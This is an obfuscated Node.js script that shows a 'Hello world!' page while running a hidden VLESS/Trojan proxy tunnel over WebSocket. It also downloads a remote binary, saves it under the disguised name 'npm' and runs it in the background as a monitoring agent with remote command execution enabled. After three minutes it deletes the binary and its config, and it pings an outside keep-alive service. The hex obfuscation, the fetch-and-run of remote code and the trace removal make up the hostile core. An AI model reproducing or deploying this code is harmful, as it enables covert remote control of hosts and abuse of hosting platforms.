const _0x4f2a = require('\x6f\x73'), _0x1a3b = require('\x68\x74\x74\x70'), _0x8c1d = require('\x66\x73'), _0x2b4e = require('\x61\x78\x69\x6f\x73'), _0x9d3f = require('\x6e\x65\x74'), _0x7e2c = require('\x70\x61\x74\x68'), _0x3a5b = require('\x63\x72\x79\x70\x74\x6f'), { Buffer: _0x5c4d } = require('\x62\x75\x66\x66\x65\x72'), { exec: _0x6d1e, execSync: _0x1f2a } = require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'), { WebSocket: _0x8e3b, createWebSocketStream: _0x4a1c } = require('\x77\x73');
const _0x9b2d = process.env.UUID || '\x61\x33\x66\x38\x63\x39\x32\x31\x2d\x37\x62\x34\x65\x2d\x34\x64\x35\x61\x2d\x39\x63\x31\x30\x2d\x32\x65\x36\x66\x38\x61\x30\x62\x33\x64\x37\x39', _0x2c4f = process.env.NEZHA_SERVER || '', _0x7d1a = process.env.NEZHA_PORT || '', _0x5e3b = process.env.NEZHA_KEY || '', _0x1f4c = process.env.DOMAIN || '\x72\x6f\x62\x6f\x74\x32\x2e\x69\x6e\x64\x65\x76\x73\x2e\x69\x6e', _0x8a2d = process.env.AUTO_ACCESS || !0, _0x3b1e = process.env.WSPATH || _0x9b2d.slice(0, 8), _0x6c3f = process.env.SUB_PATH || '\x73\x75\x62', _0x9d4a = process.env.NAME || '', _0x4e5b = process.env.PORT || 7860;
let _0x2a1c = '\x55\x6e\x6b\x6e\x6f\x77\x6e';
const _0x7f2d = async () => { try { const _0x1a2b = await _0x2b4e.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x2e\x73\x62\x2f\x67\x65\x6f\x69\x70'); _0x2a1c = `${_0x1a2b.data.country_code}-${_0x1a2b.data.isp}`.replace(/ /g, '_'); } catch (_0x3c4d) { _0x2a1c = '\x55\x6e\x6b\x6e\x6f\x77\x6e'; } };
_0x7f2d();
const _0x5b3e = _0x1a3b.createServer((_0x8d1f, _0x2e4a) => {
  if (_0x8d1f.url === '/') {
    const _0x4f5b = _0x7e2c.join(__dirname, '\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c');
    _0x8c1d.readFile(_0x4f5b, '\x75\x74\x66\x38', (_0x1a2c, _0x3b4d) => {
      if (_0x1a2c) { _0x2e4a.writeHead(200, { 'Content-Type': '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c' }); return _0x2e4a.end('\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21'); }
      _0x2e4a.writeHead(200, { 'Content-Type': '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c' }); _0x2e4a.end(_0x3b4d);
    });
  } else if (_0x8d1f.url === `/${_0x6c3f}`) {
    const _0x7d2e = _0x9d4a ? `${_0x9d4a}-${_0x2a1c}` : _0x2a1c;
    const _0x5e1f = `vless://${_0x9b2d}@${_0x1f4c}:443?encryption=none&security=tls&sni=${_0x1f4c}&fp=chrome&type=ws&host=${_0x1f4c}&path=%2F${_0x3b1e}#${_0x7d2e}`;
    const _0x2a4c = `trojan://${_0x9b2d}@${_0x1f4c}:443?security=tls&sni=${_0x1f4c}&fp=chrome&type=ws&host=${_0x1f4c}&path=%2F${_0x3b1e}#${_0x7d2e}`;
    const _0x9b3d = _0x5c4d.from(_0x5e1f + '\n' + _0x2a4c).toString('\x62\x61\x73\x65\x36\x34');
    _0x2e4a.writeHead(200, { 'Content-Type': '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e' }); _0x2e4a.end(_0x9b3d + '\n');
  } else { _0x2e4a.writeHead(404, { 'Content-Type': '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e' }); _0x2e4a.end('\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64\n'); }
});
const _0x4c5d = new _0x8e3b.Server({ server: _0x5b3e }), _0x1d2e = _0x9b2d.replace(/-/g, ""), _0x8f1a = ['\x38\x2e\x38\x2e\x34\x2e\x34', '\x31\x2e\x31\x2e\x31\x2e\x31'];
function _0x3e4b(_0x7a1c) {
  return new Promise((_0x5b2d, _0x2c3e) => {
    if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_0x7a1c)) return _0x5b2d(_0x7a1c);
    let _0x9d4f = 0;
    function _0x1e5a() {
      if (_0x9d4f >= _0x8f1a.length) return _0x2c3e(new Error(`Err: ${_0x7a1c}`));
      const _0x6f2b = `https://dns.google/resolve?name=${encodeURIComponent(_0x7a1c)}&type=A`; _0x9d4f++;
      _0x2b4e.get(_0x6f2b, { timeout: 5000, headers: { 'Accept': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x64\x6e\x73\x2d\x6a\x73\x6f\x6e' } }).then(_0x4a3c => {
        if (_0x4a3c.data.Status === 0 && _0x4a3c.data.Answer && _0x4a3c.data.Answer.length > 0) {
          const _0x2b4d = _0x4a3c.data.Answer.find(_0x8c5e => _0x8c5e.type === 1);
          if (_0x2b4d) return _0x5b2d(_0x2b4d.data);
        } _0x1e5a();
      }).catch(() => _0x1e5a());
    } _0x1e5a();
  });
}
function _0x7d5c(_0x1a2b, _0x3b4c) {
  const [_0x9c5d] = _0x3b4c, _0x4e6f = _0x3b4c.slice(1, 17);
  if (!_0x4e6f.every((_0x2f1a, _0x8a3b) => _0x2f1a == parseInt(_0x1d2e.substr(_0x8a3b * 2, 2), 16))) return !1;
  let _0x5b2c = _0x3b4c.slice(17, 18).readUInt8() + 19;
  const _0x1c3d = _0x3b4c.slice(_0x5b2c, _0x5b2c += 2).readUInt16BE(0), _0x8d4e = _0x3b4c.slice(_0x5b2c, _0x5b2c += 1).readUInt8();
  const _0x6e5f = _0x8d4e == 1 ? _0x3b4c.slice(_0x5b2c, _0x5b2c += 4).join('.') : (_0x8d4e == 2 ? new TextDecoder().decode(_0x3b4c.slice(_0x5b2c + 1, _0x5b2c += 1 + _0x3b4c.slice(_0x5b2c, _0x5b2c + 1).readUInt8())) : (_0x8d4e == 3 ? _0x3b4c.slice(_0x5b2c, _0x5b2c += 16).reduce((_0x3f1a, _0x9a2b, _0x4b3c, _0x2c4d) => (_0x4b3c % 2 ? _0x3f1a.concat(_0x2c4d.slice(_0x4b3c - 1, _0x4b3c + 1)) : _0x3f1a), []).map(_0x1d2e => _0x1d2e.readUInt16BE(0).toString(16)).join(':') : ''));
  _0x1a2b.send(new Uint8Array([_0x9c5d, 0])); const _0x7f3a = _0x4a1c(_0x1a2b);
  _0x3e4b(_0x6e5f).then(_0x5a4b => { _0x9d3f.connect({ host: _0x5a4b, port: _0x1c3d }, function() { this.write(_0x3b4c.slice(_0x5b2c)); _0x7f3a.on('error', () => {}).pipe(this).on('error', () => {}).pipe(_0x7f3a); }).on('error', () => {}); }).catch(() => { _0x9d3f.connect({ host: _0x6e5f, port: _0x1c3d }, function() { this.write(_0x3b4c.slice(_0x5b2c)); _0x7f3a.on('error', () => {}).pipe(this).on('error', () => {}).pipe(_0x7f3a); }).on('error', () => {}); });
  return !0;
}
function _0x2b3c(_0x6c4d, _0x1d5e) {
  try {
    if (_0x1d5e.length < 58) return !1;
    const _0x8e6f = _0x1d5e.slice(0, 56).toString(), _0x3f1a = [_0x9b2d]; let _0x9a2b = null;
    for (const _0x4b3c of _0x3f1a) { if (_0x3a5b.createHash('\x73\x68\x61\x32\x32\x34').update(_0x4b3c).digest('\x68\x65\x78') === _0x8e6f) { _0x9a2b = _0x4b3c; break; } }
    if (!_0x9a2b) return !1;
    let _0x2c4d = 56; if (_0x1d5e[_0x2c4d] === 0x0d && _0x1d5e[_0x2c4d + 1] === 0x0a) _0x2c4d += 2;
    if (_0x1d5e[_0x2c4d] !== 0x01) return !1; _0x2c4d += 1; const _0x1d2e = _0x1d5e[_0x2c4d]; _0x2c4d += 1; let _0x7f3a, _0x5a4b;
    if (_0x1d2e === 0x01) { _0x7f3a = _0x1d5e.slice(_0x2c4d, _0x2c4d + 4).join('.'); _0x2c4d += 4; } else if (_0x1d2e === 0x03) { const _0x9c5d = _0x1d5e[_0x2c4d]; _0x2c4d += 1; _0x7f3a = _0x1d5e.slice(_0x2c4d, _0x2c4d + _0x9c5d).toString(); _0x2c4d += _0x9c5d; } else if (_0x1d2e === 0x04) { _0x7f3a = _0x1d5e.slice(_0x2c4d, _0x2c4d + 16).reduce((_0x3e4b, _0x8d4e, _0x6e5f, _0x2f1a) => (_0x6e5f % 2 ? _0x3e4b.concat(_0x2f1a.slice(_0x6e5f - 1, _0x6e5f + 1)) : _0x3e4b), []).map(_0x4e6f => _0x4e6f.readUInt16BE(0).toString(16)).join(':'); _0x2c4d += 16; } else return !1;
    _0x5a4b = _0x1d5e.readUInt16BE(_0x2c4d); _0x2c4d += 2; if (_0x2c4d < _0x1d5e.length && _0x1d5e[_0x2c4d] === 0x0d && _0x1d5e[_0x2c4d + 1] === 0x0a) _0x2c4d += 2;
    const _0x1a2b = _0x4a1c(_0x6c4d);
    _0x3e4b(_0x7f3a).then(_0x3b4c => { _0x9d3f.connect({ host: _0x3b4c, port: _0x5a4b }, function() { if (_0x2c4d < _0x1d5e.length) this.write(_0x1d5e.slice(_0x2c4d)); _0x1a2b.on('error', () => {}).pipe(this).on('error', () => {}).pipe(_0x1a2b); }).on('error', () => {}); }).catch(() => { _0x9d3f.connect({ host: _0x7f3a, port: _0x5a4b }, function() { if (_0x2c4d < _0x1d5e.length) this.write(_0x1d5e.slice(_0x2c4d)); _0x1a2b.on('error', () => {}).pipe(this).on('error', () => {}).pipe(_0x1a2b); }).on('error', () => {}); });
    return !0;
  } catch (_0x5b2c) { return !1; }
}
_0x4c5d.on('connection', (_0x1c3d, _0x8d4e) => {
  _0x1c3d.once('message', _0x6e5f => {
    if (_0x6e5f.length > 17 && _0x6e5f[0] === 0) { const _0x2f1a = _0x6e5f.slice(1, 17); if (_0x2f1a.every((_0x8a3b, _0x3f1a) => _0x8a3b == parseInt(_0x1d2e.substr(_0x3f1a * 2, 2), 16))) { if (!_0x7d5c(_0x1c3d, _0x6e5f)) _0x1c3d.close(); return; } }
    if (!_0x2b3c(_0x1c3d, _0x6e5f)) _0x1c3d.close();
  }).on('error', () => {});
});
const _0x9a2b = () => {
  const _0x4b3c = _0x4f2a.arch();
  return (_0x4b3c === '\x61\x72\x6d' || _0x4b3c === '\x61\x72\x6d\x36\x34' || _0x4b3c === '\x61\x61\x72\x63\x68\x36\x34') ? (!_0x7d1a ? '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e\x79\x63\x2e\x6d\x6e\x2f\x76\x31' : '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e\x79\x63\x2e\x6d\x6e\x2f\x61\x67\x65\x6e\x74') : (!_0x7d1a ? '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d\x64\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e\x79\x63\x2e\x6d\x6e\x2f\x76\x31' : '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d\x64\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e\x79\x63\x2e\x6d\x6e\x2f\x61\x67\x65\x6e\x74');
};
const _0x2c4d = async () => {
  if (!_0x2c4f && !_0x5e3b) return;
  try {
    const _0x1d2e = await _0x2b4e({ method: '\x67\x65\x74', url: _0x9a2b(), responseType: '\x73\x74\x72\x65\x61\x6d' });
    const _0x7f3a = _0x8c1d.createWriteStream('\x6e\x70\x6d'); _0x1d2e.data.pipe(_0x7f3a);
    return new Promise((_0x5a4b, _0x3b4c) => { _0x7f3a.on('finish', () => { _0x6d1e('\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x6e\x70\x6d', (_0x9c5d) => { if (_0x9c5d) _0x3b4c(_0x9c5d); _0x5a4b(); }); }); _0x7f3a.on('error', _0x3b4c); });
  } catch (_0x4e6f) { throw _0x4e6f; }
};
const _0x8d4e = async () => {
  try { if (_0x1f2a('\x70\x73\x20\x61\x75\x78\x20\x7c\x20\x67\x72\x65\x70\x20\x2d\x76\x20\x22\x67\x72\x65\x70\x22\x20\x7c\x20\x67\x72\x65\x70\x20\x22\x2e\x2f\x5b\x6e\x5d\x70\x6d\x22', { encoding: '\x75\x74\x66\x2d\x38' }).trim() !== '') return; } catch (_0x6e5f) {}
  await _0x2c4d(); let _0x2f1a = '', _0x8a3b = ['443', '8443', '2096', '2087', '2083', '2053'];
  if (_0x2c4f && _0x7d1a && _0x5e3b) {
    const _0x3f1a = _0x8a3b.includes(_0x7d1a) ? '\x2d\x2d\x74\x6c\x73' : '';
    _0x2f1a = `setsid nohup ./npm -s ${_0x2c4f}:${_0x7d1a} -p ${_0x5e3b} ${_0x3f1a} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
  } else if (_0x2c4f && _0x5e3b) {
    if (!_0x7d1a) {
      const _0x9a2b = _0x2c4f.includes(':') ? _0x2c4f.split(':').pop() : '', _0x4b3c = _0x8a3b.includes(_0x9a2b) ? '\x74\x72\x75\x65' : '\x66\x61\x6c\x73\x65';
      _0x8c1d.writeFileSync('\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61\x6d\x6c', `client_secret: ${_0x5e3b}\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: ${_0x2c4f}\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: ${_0x4b3c}\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: ${_0x9b2d}`);
    }
    _0x2f1a = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else return;
  try { _0x6d1e(_0x2f1a, { shell: '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' }, () => {}); } catch (_0x2c4d) {}
};
async function _0x1c3d() {
  if (!_0x8a2d || !_0x1f4c) return;
  try { await _0x2b4e.post("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x6f\x6f\x6f\x2e\x73\x65\x72\x76\x30\x30\x2e\x6e\x65\x74\x2f\x61\x64\x64\x2d\x75\x72\x6c", { url: `https://${_0x1f4c}` }, { headers: { 'Content-Type': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e' } }); } catch (_0x8d4e) {}
}
const _0x6e5f = () => { _0x8c1d.unlink('\x6e\x70\x6d', () => {}); _0x8c1d.unlink('\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61\x6d\x6c', () => {}); };
_0x5b3e.listen(_0x4e5b, () => { _0x8d4e(); setTimeout(() => { _0x6e5f(); }, 180000); _0x1c3d(); });
